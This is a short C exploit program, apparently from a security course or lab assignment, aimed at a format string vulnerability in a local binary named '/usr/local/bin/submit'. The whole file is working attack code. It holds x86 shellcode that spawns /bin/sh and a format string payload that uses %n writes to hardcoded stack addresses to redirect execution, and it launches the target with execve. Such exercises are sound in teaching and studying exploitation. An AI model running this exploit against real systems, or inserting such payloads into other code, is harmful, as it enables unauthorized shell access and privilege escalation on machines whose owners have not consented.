/*
 * Exploit 2: Format string vulnerability
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/submit" // or submitV2

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(void) {
	char *args[5];

  // 0xffbfde3c
	args[0] = "%134u%245$n%57u%246$n%224u%247$n%64u%248$n";
  args[1] = "-v";
  // 0xffbfdfa6
  args[2] = shellcode;
  args[3] = "\x3c\xde\xbf\xff\x3d\xde\xbf\xff\x3e\xde\xbf\xff\x3f\xde\xbf\xff.";
	args[4] = NULL;

	execve(TARGET, args, NULL);
	// execve only returns if it fails
	fprintf(stderr, "execve failed\n");
	return 1;
}
